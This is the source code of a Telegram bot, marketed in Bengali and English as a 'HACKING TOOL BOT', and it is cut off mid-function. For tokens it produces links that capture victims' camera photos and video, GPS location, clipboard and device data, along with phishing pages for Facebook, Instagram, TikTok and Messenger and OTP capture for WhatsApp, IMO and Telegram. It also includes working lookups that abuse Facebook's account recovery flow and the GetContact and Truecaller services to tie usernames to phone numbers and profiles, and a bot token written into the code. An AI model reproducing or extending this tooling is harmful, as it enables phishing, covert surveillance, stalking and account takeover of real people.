'use strict';
// npm install express node-telegram-bot-api axios multer body-parser

const express    = require('express');
const http       = require('http');
const TBot       = require('node-telegram-bot-api');
const multer     = require('multer');
const bodyParser = require('body-parser');
const axios      = require('axios');
const crypto     = require('crypto');
const fs         = require('fs');

// ══════════════════════════════════════════════════════
// CONFIG
// ══════════════════════════════════════════════════════
const CFG = {
    TOKEN:        process.env.TOKEN        || '9208659454:AAF2O74CTpRExbiaguhSL_eFCVgSMJK1oW8',
    ADMIN_ID:     process.env.ADMIN_ID     || '8370261764',
    CHANNEL:      'rakibfxatrading',
    FB_PAGE:      'https://www.facebook.com/profile.php?id=61596403274813',
    START_IMG:    'https://hc1.checker.in/file2link/photos/file_661524.jpg/file_661524.jpg',
    LURE_VID:     'http://hc1.checker.in/file2link/videos/file_657140.mp4/',
    PORT:         parseInt(process.env.PORT || '8999'),
    LINK_COST:    5,
    SIGNUP_BONUS: 5,
    REF_BONUS:    5,
    REF_REWARD:   5,
    FREE_REFS:    3,
    LINK_TTL_MS:  72 * 60 * 60 * 1000,
    BASE_URL:     process.env.RENDER_EXTERNAL_URL || '',
    GC_TOKEN:     process.env.GC_TOKEN || '',
    TC_AUTH:      process.env.TC_AUTH  || '',
    DATA_FILE:    process.env.DATA_FILE || '/tmp/botdata.json',

    FREE_USERS: [
        '8294558143',
        // add more IDs here
    ],

    SLIDE_IMAGES: [
        'https://picsum.photos/seed/bd1/800/500',
        'https://picsum.photos/seed/bd2/800/500',
        'https://picsum.photos/seed/bd3/800/500',
        'https://picsum.photos/seed/bd4/800/500',
        'https://picsum.photos/seed/bd5/800/500',
        'https://picsum.photos/seed/bd6/800/500',
    ],
    SLIDE_AUDIO: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
};

// ══════════════════════════════════════════════════════
// LOGGER
// ══════════════════════════════════════════════════════
const log = {
    _w: (l, m) => console.log(`[${new Date().toISOString()}] ${l}: ${m}`),
    info:  m => log._w('INFO ', m),
    warn:  m => log._w('WARN ', m),
    error: m => log._w('ERROR', m),
};

// ══════════════════════════════════════════════════════
// STORE
// ══════════════════════════════════════════════════════
let store = { users:{}, vip:{}, links:{}, pending:{}, sessions:{}, rate:{} };

function saveStore() {
    try {
        const tmp = CFG.DATA_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(store), 'utf8');
        fs.renameSync(tmp, CFG.DATA_FILE);
    } catch(e) { log.warn('Save: ' + e.message); }
}
function loadStore() {
    try {
        if (fs.existsSync(CFG.DATA_FILE)) {
            store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8')) };
            log.info('Store loaded');
        }
    } catch(e) { log.warn('Load: ' + e.message); }
}
loadStore();
setInterval(saveStore, 60000);

function isFreeUser(uid) { return CFG.FREE_USERS.includes(String(uid)); }
function isAdmin(uid)    { return String(uid) === String(CFG.ADMIN_ID); }

function getUser(uid) {
    uid = String(uid);
    if (!store.users[uid]) {
        store.users[uid] = {
            balance:CFG.SIGNUP_BONUS, refs:0, refBy:null,
            lifetime:false, linksMade:0, joinDate:Date.now(), banned:false,
        };
        saveStore();
    }
    const u = store.users[uid];
    u.isAdmin    = isAdmin(uid);
    u.isVIP      = !!store.vip[uid];
    u.isFreeUser = isFreeUser(uid);
    u.lifetime   = !!(u.lifetime || u.isAdmin || u.isVIP || u.isFreeUser);
    return u;
}

function checkRate(uid) {
    if (isAdmin(uid) || isFreeUser(uid)) return true;
    const now = Date.now(), r = store.rate[String(uid)];
    if (!r || now - r.ws > 10000) { store.rate[String(uid)] = { c:1, ws:now }; return true; }
    if (r.c >= 3) return false;
    r.c++; return true;
}

function mkLink(action, uid, req) {
    const tok = crypto.randomBytes(16).toString('hex');
    const url = getBase(req) + '/go/' + tok;
    store.links[tok] = {
        action, uid:String(uid), url,
        expiresAt:Date.now()+CFG.LINK_TTL_MS, createdAt:Date.now(),
    };
    const u = getUser(String(uid));
    u.linksMade = (u.linksMade||0) + 1;
    saveStore();
    return url;
}
function getLink(tok) { const l=store.links[tok]; return l&&l.expiresAt>Date.now()?l:null; }
function userLinks(uid) {
    return Object.entries(store.links)
        .filter(([,l])=>l.uid===String(uid)&&l.expiresAt>Date.now())
        .sort(([,a],[,b])=>b.createdAt-a.createdAt)
        .slice(0,20).map(([tok,l])=>({tok,...l}));
}
function getSession(sid) { return store.sessions[sid]||{}; }
function setSession(sid,d){ store.sessions[sid]={...d, createdAt:Date.now()}; }
function setPending(uid,type){ store.pending[String(uid)]={type, createdAt:Date.now()}; }
function getPending(uid){ return store.pending[String(uid)]||null; }
function delPending(uid){ delete store.pending[String(uid)]; }
function parseCookies(h){ return (h['set-cookie']||[]).map(c=>c.split(';')[0]).join('; '); }

function cleanup() {
    const now = Date.now();
    for (const t of Object.keys(store.links))    if (store.links[t].expiresAt<now) delete store.links[t];
    for (const u of Object.keys(store.pending))  if (now-store.pending[u].createdAt>600000) delete store.pending[u];
    for (const s of Object.keys(store.sessions)) if (now-store.sessions[s].createdAt>3600000) delete store.sessions[s];
    for (const r of Object.keys(store.rate))     if (now-store.rate[r].ws>10000) delete store.rate[r];
    saveStore();
}
setInterval(cleanup, 600000);

// ══════════════════════════════════════════════════════
// MSG QUEUE
// ══════════════════════════════════════════════════════
const Q=[]; let QR=false;
function enqueue(fn){return new Promise((res,rej)=>{Q.push({fn,res,rej});if(!QR)drain();});}
async function drain(){
    QR=true;
    while(Q.length){const{fn,res,rej}=Q.shift();try{res(await fn());}catch(e){rej(e);}await new Promise(r=>setTimeout(r,100));}
    QR=false;
}

// ══════════════════════════════════════════════════════
// EXPRESS + BOT
// ══════════════════════════════════════════════════════
const app    = express();
const server = http.createServer(app);
const upload = multer({limits:{fileSize:50*1024*1024},storage:multer.memoryStorage()});
app.use(bodyParser.json({limit:'50mb'}));
app.use(bodyParser.urlencoded({extended:true,limit:'50mb'}));

const bot = new TBot(CFG.TOKEN,{polling:{interval:300,autoStart:true,params:{timeout:10}}});
bot.on('polling_error',e=>{log.error('Polling: '+e.message);if(e.code==='EFATAL')setTimeout(()=>bot.startPolling(),5000);});
bot.on('error',e=>log.error('Bot: '+e.message));

function getBase(req){
    if(CFG.BASE_URL) return CFG.BASE_URL;
    if(req) return `${req.protocol}://${req.get('host')}`;
    return `http://localhost:${CFG.PORT}`;
}

function tgMsg(c,t,o={}){
    return enqueue(()=>bot.sendMessage(c,(t||'').slice(0,4096),{parse_mode:'HTML',...o}).catch(async e=>{
        if(e.response&&e.response.statusCode===429){
            const w=(e.response.body&&e.response.body.parameters&&e.response.body.parameters.retry_after)||5;
            await new Promise(r=>setTimeout(r,w*1000));
            return bot.sendMessage(c,(t||'').slice(0,4096),{parse_mode:'HTML',...o});
        }
        log.warn(`tgMsg ${c}: ${e.message}`);
    }));
}
function tgPic(c,b,cap){return enqueue(()=>bot.sendPhoto(c,b,{caption:cap,parse_mode:'HTML'}).catch(e=>log.warn('tgPic:'+e.message)));}
function tgLoc(c,la,lo){return enqueue(()=>bot.sendLocation(c,la,lo).catch(e=>log.warn('tgLoc:'+e.message)));}
function tgDoc(c,b,fn,mt,cap){
    return enqueue(()=>bot.sendDocument(c,b,{caption:cap,parse_mode:'HTML'},{filename:fn,contentType:mt})
        .catch(e=>bot.sendVideo(c,b,{caption:cap,parse_mode:'HTML'}).catch(e2=>log.warn('tgDoc:'+e2.message))));
}

async function checkJoin(uid){
    try{const m=await bot.getChatMember('@'+CFG.CHANNEL,uid);return['member','administrator','creator'].includes(m.status);}
    catch{return false;}
}

function actionLabel(a){
    return{
        cam_f:'📷 Front Camera Photo',cam_b:'📷 Back Camera Photo',
        cam_fv:'🎥 Front Camera Video',cam_bv:'🎥 Back Camera Video',
        loc:'📍 Location Tracker',phish_fb:'🎣 Facebook',phish_ig:'📸 Instagram',
        phish_tt:'🎵 TikTok',phish_msgr:'📨 Messenger',phish_wa:'📱 WhatsApp OTP',
        phish_imo:'💬 IMO OTP',phish_tg:'✈️ Telegram OTP',msgr_info:'💌 Message Info',
        ip_info:'🌐 IP & Device Info',clipboard:'📋 Clipboard Grab',
        battery:'🔋 Device Info Grab',wifi_info:'📶 WiFi Info Grab',
    }[a]||a;
}

// ══════════════════════════════════════════════════════
// LOOKUP ENGINES
// ══════════════════════════════════════════════════════
async function sg(url,o={},l=''){try{return await axios.get(url,{timeout:10000,...o});}catch(e){log.warn(`[${l}] ${e.message}`);return null;}}
async function sp(url,d,o={},l=''){try{return await axios.post(url,d,{timeout:10000,...o});}catch(e){log.warn(`[${l}] ${e.message}`);return null;}}

async function lookupTgUsername(username){
    username=username.replace(/^@/,'').trim().toLowerCase();
    const R={username,id:null,name:null,bio:null,phone:null,phoneSource:null,sources:[]};
    const tm=await sg(`https://t.me/${username}`,{headers:{'User-Agent':'TelegramBot/1.0'}},'tme');
    if(tm){const nm=tm.data.match(/<meta property="og:title" content="([^"]+)"/);const bm=tm.data.match(/<meta property="og:description" content="([^"]+)"/);if(nm)R.name=nm[1];if(bm)R.bio=bm[1];R.sources.push('t.me');}
    const fr=await sg(`https://fragment.com/username/${encodeURIComponent(username)}`,{headers:{'User-Agent':'Mozilla/5.0'}},'frag');
    if(fr){const im=fr.data.match(/"peer_id":(\d+)/);const pm=fr.data.match(/\+\d[\d\s\-()]{6,14}\d/g);if(im&&!R.id){R.id=im[1];R.sources.push('Fragment');}if(pm&&!R.phone){R.phone=pm[0].replace(/\s/g,'');R.phoneSource='Fragment';R.sources.push('Fragment Phone');}}
    const tg=await sg(`https://tgstat.com/channel/@${username}`,{headers:{'User-Agent':'Mozilla/5.0'}},'tgstat');
    if(tg&&!R.id){const m=tg.data.match(/tg:\/\/user\?id=(\d+)/);if(m){R.id=m[1];R.sources.push('TGStat');}}
    if(!R.phone&&CFG.GC_TOKEN){
        const gc=await sp('https://pbhs2.getcontact.com/profile/v3/search',{query:username,countryCode:'BD',source:'SEARCH'},{headers:{'Authorization':`Bearer ${CFG.GC_TOKEN}`,'User-Agent':'GetContact/7.0.0 (Android 13)','Content-Type':'application/json','x-client-version':'7.0.0','x-device-id':crypto.randomBytes(8).toString('hex')}},'gc');
        if(gc&&gc.data&&gc.data.result){const ps=gc.data.result.profiles||(Array.isArray(gc.data.result)?gc.data.result:[gc.data.result]);for(const p of ps){const ph=p.phone||p.phoneNumber;if(ph){R.phone=ph.startsWith('+')?ph:'+'+ph;R.phoneSource='GetContact';R.sources.push('GetContact');break;}}}
        if(!R.phone){const gc2=await sg(`https://pbhs2.getcontact.com/profile/v3/username/telegram/${encodeURIComponent(username)}`,{headers:{'Authorization':`Bearer ${CFG.GC_TOKEN}`,'User-Agent':'GetContact/7.0.0 (Android 13)','x-client-version':'7.0.0'}},'gc2');if(gc2&&gc2.data){const ph=gc2.data.phone||gc2.data.phoneNumber;if(ph){R.phone=ph.startsWith('+')?ph:'+'+ph;R.phoneSource='GetContact Username';R.sources.push('GetContact Username');}}}
    }
    if(!R.phone&&CFG.TC_AUTH&&R.name){const tc=await sg(`https://search5-noneu.truecaller.com/v2/search?q=${encodeURIComponent(R.name)}&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json`,{headers:{'Authorization':CFG.TC_AUTH,'User-Agent':'Truecaller/13.0.0 (Android 13)','Accept':'application/json'}},'tc');if(tc&&tc.data&&tc.data.data&&tc.data.data.length){for(const e of tc.data.data){const en=(e.name||'').toLowerCase(),on=(R.name||'').toLowerCase().split(' ')[0];if(en.includes(on)&&e.phones&&e.phones.length){R.phone=e.phones[0].e164Format||e.phones[0].nationalFormat;R.phoneSource='Truecaller';R.sources.push('Truecaller');break;}}}}
    return R;
}

async function lookupFbByPhone(phone){
    phone=phone.trim().replace(/[\s\-()]/g,'');
    if(!phone.startsWith('+')) phone='+880'+phone.replace(/^0+/,'');
    const R={phone,id:null,name:null,profileUrl:null,email:null,sources:[]};
    try{
        const pg=await sg('https://www.facebook.com/login/identify/',{headers:{'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15','Accept-Language':'en-US,en;q=0.9'},maxRedirects:5},'fb-pg');
        if(pg){
            const cookies=parseCookies(pg.headers);
            const lsdM=pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/);const lsd=lsdM?lsdM[1]:'';
            const dtsgM=pg.data.match(/name="fb_dtsg" value="([^"]+)"/)|| pg.data.match(/"dtsg":\{"token":"([^"]+)"/);const dtsg=dtsgM?dtsgM[1]:'';
            const init=await sp('https://www.facebook.com/ajax/recover/initiate/',new URLSearchParams({lsd,email_or_phone:phone,did_login:'0',fur_initiated:'0',action:'initiate',fb_dtsg:dtsg}).toString(),{headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)','Cookie':cookies,'X-Requested-With':'XMLHttpRequest','Referer':'https://www.facebook.com/login/identify/','Origin':'https://www.facebook.com'}},'fb-rec');
            if(init){
                const raw=init.data.replace(/^[^{\[]*(?=[{\[])/,'');
                for(const pat of[/["']?uid["']?:\s*["']?(\d{5,})["']?/,/["']?account_id["']?:\s*["']?(\d{5,})["']?/,/profile\.php\?id=(\d{5,})/,/\/(\d{10,})\/picture/]){const m=raw.match(pat);if(m){R.id=m[1];break;}}
                const nm=raw.match(/"(?:name|display_name)":"([^"\\]+)"/);const em=raw.match(/[\w.+]+\*+[\w.]*@[\w.]+/);
                if(nm)R.name=nm[1].replace(/\\u([\dA-F]{4})/gi,(_,c)=>String.fromCharCode(parseInt(c,16)));
                if(em)R.email=em[0];
                if(R.id){R.profileUrl=`https://www.facebook.com/profile.php?id=${R.id}`;R.sources.push('FB Recovery');}
            }
        }
    }catch(e){log.warn('FB Recovery: '+e.message);}
    if(CFG.GC_TOKEN&&!R.name){const gc=await sp('https://pbhs2.getcontact.com/profile/v3/search',{query:phone,countryCode:'BD',source:'PHONE'},{headers:{'Authorization':`Bearer ${CFG.GC_TOKEN}`,'User-Agent':'GetContact/7.0.0 (Android 13)','Content-Type':'application/json','x-client-version':'7.0.0'}},'gc-rev');if(gc&&gc.data&&gc.data.result){const n=gc.data.result.displayName||gc.data.result.name;if(n){R.name=n;R.sources.push('GetContact');}}}
    if(CFG.TC_AUTH&&!R.name){const tc=await sg(`https://search5-noneu.truecaller.com/v2/search?q=${encodeURIComponent(phone)}&countryCode=BD&type=4&placement=SEARCHRESULTS,APP,FALSE&encoding=json`,{headers:{'Authorization':CFG.TC_AUTH,'User-Agent':'Truecaller/13.0.0 (Android 13)','Accept':'application/json'}},'tc-ph');if(tc&&tc.data&&tc.data.data&&tc.data.data.length){const n=tc.data.data[0].name;if(n){R.name=n;R.sources.push('Truecaller');}}}
    if(!R.id&&R.name){const ms=await sg(`https://m.facebook.com/search/people/?q=${encodeURIComponent(R.name)}&ref=comet_topbar`,{headers:{'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15','Accept-Language':'en-US'}},'fb-ms');if(ms){const m=ms.data.match(/profile\.php\?id=(\d{10,})/)||ms.data.match(/"userID":"(\d{10,})"/);if(m){R.id=m[1];R.profileUrl=`https://www.facebook.com/profile.php?id=${R.id}`;R.sources.push('FB Name Search');}}}
    if(!R.id){const gp=await sg(`https://graph.facebook.com/v18.0/?id=${encodeURIComponent(phone)}&fields=id,name`,{headers:{'User-Agent':'Mozilla/5.0'}},'graph');if(gp&&gp.data&&gp.data.id){R.id=gp.data.id;R.name=R.name||gp.data.name||null;R.profileUrl=`https://www.facebook.com/profile.php?id=${R.id}`;R.sources.push('Graph API');}}
    return R;
}

// ══════════════════════════════════════════════════════
// KEYBOARDS
// ══════════════════════════════════════════════════════

// ── /start keyboard — channel join + FB follow + verify ──
const startKb = uid => ({inline_keyboard:[
    [{text:'📢 Join Official Channel', url:'https://t.me/'+CFG.CHANNEL}],
    [{text:'👍 Follow Our Facebook Page', url:CFG.FB_PAGE}],
    [{text:'✅ Verify & Get Access', callback_data:'VERIFY_'+uid}],
]});

const backKb = {inline_keyboard:[[{text:'◀️ Main Menu',callback_data:'M_BACK'}]]};

function mainKb(uid){
    const kb=[
        [{text:'📷 Front Camera Photo', callback_data:'LNK_cam_f'      },{text:'📷 Back Camera Photo',  callback_data:'LNK_cam_b'    }],
        [{text:'🎥 Front Camera Video', callback_data:'LNK_cam_fv'     },{text:'🎥 Back Camera Video',  callback_data:'LNK_cam_bv'   }],
        [{text:'📍 Location Tracker',   callback_data:'LNK_loc'         }],
        [{text:'🎣 Facebook',            callback_data:'LNK_phish_fb'   },{text:'📸 Instagram',          callback_data:'LNK_phish_ig' }],
        [{text:'🎵 TikTok',              callback_data:'LNK_phish_tt'   },{text:'📨 Messenger',          callback_data:'LNK_phish_msgr'}],
        [{text:'📱 WhatsApp OTP',        callback_data:'LNK_phish_wa'   },{text:'💬 IMO OTP',            callback_data:'LNK_phish_imo'}],
        [{text:'✈️ Telegram OTP',        callback_data:'LNK_phish_tg'   }],
        [{text:'🌐 IP & Device Info',    callback_data:'LNK_ip_info'    },{text:'📋 Clipboard Grab',     callback_data:'LNK_clipboard'}],
        [{text:'🔋 Device Info Grab',    callback_data:'LNK_battery'    },{text:'📶 WiFi Info Grab',     callback_data:'LNK_wifi_info'}],
        [{text:'💌 Message Info Link',   callback_data:'LNK_msgr_info'  }],
        [{text:'🔍 TG Username → Phone', callback_data:'LOOKUP_TG'      },{text:'🔍 Phone → FB ID',      callback_data:'LOOKUP_FB'    }],
        [{text:'📂 Link Manager',        callback_data:'LINK_MGR'       },{text:'💰 My Balance',         callback_data:'BALANCE'      }],
        [{text:'🔗 Referral Link',       callback_data:'REFERRAL'       },{text:'❓ How To Use',         callback_data:'HOW_TO'       }],
        // ── Facebook follow shortcut always visible in menu ──
        [{text:'👍 Follow Our Facebook', url:CFG.FB_PAGE}],
    ];
    if(isAdmin(uid)) kb.push([{text:'👑 VIP Manager',callback_data:'VIP_MGR'},{text:'📊 Stats',callback_data:'STATS'}]);
    return{inline_keyboard:kb};
}

function linkKb(d){
    return{inline_keyboard:[
        [{text:'📋 Copy Link',callback_data:'COPY_'+d},{text:'🔄 New Link',callback_data:d}],
        [{text:'📂 Link Manager',callback_data:'LINK_MGR'},{text:'◀️ Main Menu',callback_data:'M_BACK'}]
    ]};
}

// ══════════════════════════════════════════════════════
// /start
// ══════════════════════════════════════════════════════
bot.onText(/\/start(?:\s+(.+))?/, async msg=>{
    const cid=String(msg.chat.id), name=msg.from.first_name||'বন্ধু', arg=(msg.text.split(' ')[1]||'').trim();
    const isNew=!store.users[cid];
    const u=getUser(cid);
    if(u.banned) return;

    if(isNew&&arg&&arg!==cid&&store.users[arg]){
        const ref=store.users[arg];
        if(!ref.banned){
            u.refBy=arg; u.balance=(u.balance||0)+CFG.REF_BONUS;
            ref.refs=(ref.refs||0)+1; ref.balance=(ref.balance||0)+CFG.REF_REWARD;
            if(ref.refs>=CFG.FREE_REFS) ref.lifetime=true;
            saveStore();
            tgMsg(arg,
`🎉 <b>New Referral!</b>
👤 Someone joined via your link!
💰 You earned: <b>+${CFG.REF_REWARD} Tokens</b>
🏆 Total: <b>${ref.refs}</b>
${ref.lifetime?'\n🎊 <b>Lifetime Free Unlocked!</b>':`\n🔄 <b>${CFG.FREE_REFS-ref.refs}</b> more needed`}`
            );
        }
    }

    const caption =
`🔥 <b>স্বাগতম, ${name}!</b> 🔥

┌─────────────────────────┐
│  🛠️  <b>HACKING TOOL BOT</b>  🛠️  │
└─────────────────────────┘

🎯 <b>Available Tools:</b>
├ 📷 Camera Photo (Front & Back)
├ 🎥 Camera Video (Front & Back)
├ 📍 Live Location Tracker
├ 🎣 Phishing (FB · IG · TT · Msgr)
├ 📱 Real OTP Hack (WA · IMO · TG)
├ 🌐 IP Address & Device Info
├ 📋 Clipboard Content Grabber
├ 🔋 Battery & Device Info
├ 📶 WiFi Network Info
├ 💌 Messenger Contact Harvester
├ 🔍 TG Username → Phone Number
└ 🔍 Phone Number → Facebook ID

━━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Signup Bonus: +${CFG.SIGNUP_BONUS} Token (1 free link!)</b>
🔗 Refer ${CFG.FREE_REFS} friends = <b>♾️ Lifetime Free!</b>
━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ <b>শুরু করতে:</b>
1️⃣ চ্যানেলে জয়েন করুন
2️⃣ 👍 আমাদের Facebook Follow করুন
3️⃣ <b>✅ Verify &amp; Get Access</b> চাপুন
4️⃣ মেইন মেনু আনলক! 🔓`;

    try{ await bot.sendPhoto(cid,CFG.START_IMG,{caption,parse_mode:'HTML',reply_markup:startKb(cid)}); }
    catch(e){ tgMsg(cid,caption,{reply_markup:startKb(cid)}); }
});

bot.onText(/\/menu/, async msg=>{
    const cid=String(msg.chat.id),u=getUser(cid);
    if(u.banned) return;
    if(!isAdmin(cid)&&!isFreeUser(cid)&&!(await checkJoin(cid)))
        return tgMsg(cid,'⛔ আগে চ্যানেলে জয়েন করুন।',{reply_markup:startKb(cid)});
    sendMainMenu(cid);
});

// admin commands
bot.onText(/\/addvip\s+(\d+)/,    async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];store.vip[tid]=true;getUser(tid).lifetime=true;saveStore();tgMsg(msg.chat.id,`👑 VIP: <code>${tid}</code>`);tgMsg(tid,'🎊 <b>Lifetime Free Access granted!</b>').catch(()=>{});});
bot.onText(/\/removevip\s+(\d+)/, async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];delete store.vip[tid];if(store.users[tid])store.users[tid].lifetime=false;saveStore();tgMsg(msg.chat.id,`🗑️ VIP removed: <code>${tid}</code>`);});
bot.onText(/\/ban\s+(\d+)/,       async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];getUser(tid).banned=true;saveStore();tgMsg(msg.chat.id,`🔨 Banned: <code>${tid}</code>`);});
bot.onText(/\/unban\s+(\d+)/,     async msg=>{if(!isAdmin(msg.chat.id))return;const tid=msg.text.split(' ')[1];getUser(tid).banned=false;saveStore();tgMsg(msg.chat.id,`✅ Unbanned: <code>${tid}</code>`);});
bot.onText(/\/addbal\s+(\d+)\s+(\d+)/,async msg=>{if(!isAdmin(msg.chat.id))return;const[,tid,amt]=msg.text.split(' ');const u=getUser(tid);u.balance=(u.balance||0)+parseInt(amt);saveStore();tgMsg(msg.chat.id,`💰 +${amt} → <code>${tid}</code>`);});
bot.onText(/\/freelist/,async msg=>{if(!isAdmin(msg.chat.id))return;tgMsg(msg.chat.id,`💎 <b>Free Whitelist</b>\n\n${CFG.FREE_USERS.map((id,i)=>`${i+1}. <code>${id}</code>`).join('\n')}\n\n<i>Edit CFG.FREE_USERS in code to add more.</i>`);});
bot.onText(/\/stats/,async msg=>{if(!isAdmin(msg.chat.id))return;const m=process.memoryUsage();tgMsg(msg.chat.id,`📊 Users:<b>${Object.keys(store.users).length}</b> VIP:<b>${Object.keys(store.vip).length}</b> FreeList:<b>${CFG.FREE_USERS.length}</b>\nLinks:<b>${Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length}</b> Mem:<b>${Math.round(m.heapUsed/1024/1024)}MB</b> Up:<b>${Math.floor(process.uptime()/60)}min</b>`);});
bot.onText(/\/broadcast\s+(.+)/s,async msg=>{if(!isAdmin(msg.chat.id))return;const text=msg.text.replace('/broadcast ','').trim();let s=0,f=0;for(const uid of Object.keys(store.users)){if(store.users[uid].banned)continue;try{await tgMsg(uid,`📢 <b>Announcement</b>\n\n${text}`);s++;}catch{f++;}}tgMsg(msg.chat.id,`📢 ✅${s} ❌${f}`);});

async function sendMainMenu(cid){
    const u=getUser(String(cid));
    const statusLine=u.isAdmin
        ?'│  👑 Role:      <b>Administrator</b>          │\n'
        :u.isFreeUser
        ?'│  💎 Role:      <b>Free User (Whitelisted)</b> │\n'
        :u.isVIP
        ?'│  ⭐ Role:      <b>VIP Member</b>              │\n'
        :'';
    await tgMsg(cid,
`🛠️ <b>MAIN MENU</b>

┌────────────────────────────────┐
│  📊 <b>Account Info</b>                  │
│  💰 Balance:   <b>${u.balance} Token${u.balance===1?'':'s'}</b>         │
│  🏆 Referrals: <b>${u.refs||0}/${CFG.FREE_REFS}</b>            │
│  ♾️ Lifetime:  <b>${u.lifetime?'✅ Active':'❌ Not Yet'}</b>         │
${statusLine}└────────────────────────────────┘

💡 Each link = <b>${CFG.LINK_COST} Token</b>
🔗 Refer <b>${CFG.FREE_REFS} friends</b> → <b>♾️ Free Forever!</b>`,
        {reply_markup:mainKb(String(cid))});
}

// ══════════════════════════════════════════════════════
// CALLBACK HANDLER
// ══════════════════════════════════════════════════════
bot.on('callback_query', async cbq=>{
    const uid=String(cbq.from.id), chatId=cbq.message.chat.id, msgId=cbq.message.message_id;
    const data=cbq.data, name=cbq.from.first_name||'Friend';
    if(!checkRate(uid)) return bot.answerCallbackQuery(cbq.id,{text:'⚠️ Too fast!'}).catch(()=>{});
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del=()=>bot.deleteMessage(chatId,msgId).catch(()=>{});
    const u=getUser(uid);
    if(u.banned) return;

    try{

    // ── VERIFY ──
    if(data.startsWith('VERIFY_')){
        const joined=await checkJoin(uid);
        if(!joined) return bot.answerCallbackQuery(cbq.id,{text:'⛔ আগে চ্যানেলে জয়েন করুন!',show_alert:true}).catch(()=>{});
        del();
        await tgMsg(chatId,
`✅ <b>Verified! স্বাগতম, ${name}!</b>

🎁 <b>${CFG.SIGNUP_BONUS} Token</b> পেয়েছেন — 1টি ফ্রি লিংক!

━━━━━━━━━━━━━━━━━━━━━━━━
💡 Refer ${CFG.FREE_REFS} জন = ♾️ Lifetime Free!

👍 আমাদের Facebook Follow করুন:
${CFG.FB_PAGE}
━━━━━━━━━━━━━━━━━━━━━━━━`,
            {reply_markup:{inline_keyboard:[
                [{text:'👍 Follow Our Facebook', url:CFG.FB_PAGE}],
                [{text:'🛠️ Open Main Menu',      callback_data:'OPEN_MENU'}],
            ]}}
        );
        return;
    }

    // open menu after verify
    if(data==='OPEN_MENU'){ del(); return sendMainMenu(chatId); }

    if(data==='M_BACK'||data==='ROUTE_HACK'){ del(); delPending(uid); return sendMainMenu(chatId); }

    // ── LOOKUP prompts ──
    if(data==='LOOKUP_TG'){
        del(); setPending(uid,'tg_username');
        return tgMsg(chatId,
`🔍 <b>Telegram Username → Phone</b>

${CFG.GC_TOKEN?'✅':'⚠️'} GetContact | ${CFG.TC_AUTH?'✅':'⚠️'} Truecaller
✅ Fragment · TGStat · t.me

Username পাঠান: <code>@username</code>`,
            {reply_markup:{inline_keyboard:[[{text:'❌ Cancel',callback_data:'M_BACK'}]]}});
    }

    if(data==='LOOKUP_FB'){
        del(); setPending(uid,'fb_phone');
        return tgMsg(chatId,
`🔍 <b>Phone → Facebook ID</b>

✅ FB Recovery | ${CFG.GC_TOKEN?'✅':'⚠️'} GetContact
${CFG.TC_AUTH?'✅':'⚠️'} Truecaller | ✅ Graph API

নম্বর পাঠান: <code>+8801XXXXXXXXX</code>`,
            {reply_markup:{inline_keyboard:[[{text:'❌ Cancel',callback_data:'M_BACK'}]]}});
    }

    // ── BALANCE ──
    if(data==='BALANCE'){
        del();
        return tgMsg(chatId,
`💰 <b>My Wallet</b>

💵 Balance:    <b>${u.balance} Token${u.balance===1?'':'s'}</b>
🔗 Links Made: <b>${u.linksMade||0}</b>
👥 Referrals:  <b>${u.refs||0}/${CFG.FREE_REFS}</b>
♾️ Lifetime:   <b>${u.lifetime?'✅ Active':`❌ (${CFG.FREE_REFS-(u.refs||0)} more needed)`}</b>
📅 Joined:     <b>${new Date(u.joinDate).toLocaleDateString('en-GB')}</b>
${u.isFreeUser?'\n💎 <b>Whitelisted Free User</b>':''}`,
            {reply_markup:{inline_keyboard:[
                [{text:'🔗 Get Referral Link',callback_data:'REFERRAL'}],
                [{text:'👍 Follow Facebook',   url:CFG.FB_PAGE        }],
                [{text:'◀️ Main Menu',         callback_data:'M_BACK' }],
            ]}});
    }

    if(data==='REFERRAL'){
        del();
        const me=await bot.getMe();
        const ref=`https://t.me/${me.username}?start=${uid}`;
        return tgMsg(chatId,
`🔗 <b>Your Referral Link</b>

<code>${ref}</code>

👥 <b>${u.refs||0}/${CFG.FREE_REFS}</b> referrals
💰 You earn: <b>+${CFG.REF_REWARD} Token</b> per referral
🎁 They get: <b>+${CFG.REF_BONUS} Token</b>
🏆 <b>${CFG.FREE_REFS} = ♾️ Lifetime Free!</b>`,
            {reply_markup:backKb});
    }

    if(data==='HOW_TO'){
        del();
        return tgMsg(chatId,
`❓ <b>কীভাবে ব্যবহার করবেন</b>

<b>🎁 Token System:</b>
Signup: +${CFG.SIGNUP_BONUS} | Link: -${CFG.LINK_COST}
Referral (you/them): +${CFG.REF_REWARD}/+${CFG.REF_BONUS}
${CFG.FREE_REFS} referrals = ♾️ Lifetime Free

<b>📷 Camera Photo/Video:</b>
→ Link তৈরি → ভিকটিম ক্লিক করে
→ সুন্দর picture slideshow + song চলবে
→ Browser camera permission চাইবে
→ Allow করলে photo/video আসবে!

<b>📍 Location:</b> Allow → GPS coordinates
<b>🎣 Phishing:</b> হুবহু login পেজ → password
<b>📱 OTP:</b> Real OTP trigger → capture
<b>🌐 IP Info:</b> IP + device fingerprint
<b>📋 Clipboard:</b> Copied content grab
<b>🔋 Device:</b> Battery, RAM, specs
<b>📶 WiFi:</b> Network info
<b>💌 Msg Info:</b> Contact list + chats
<b>🔍 TG:</b> @username → phone
<b>🔍 FB:</b> নম্বর → Facebook profile

━━━━━━━━━━━━━━━━━━━━━━━━
👍 আমাদের Facebook Follow করুন!`,
            {reply_markup:{inline_keyboard:[
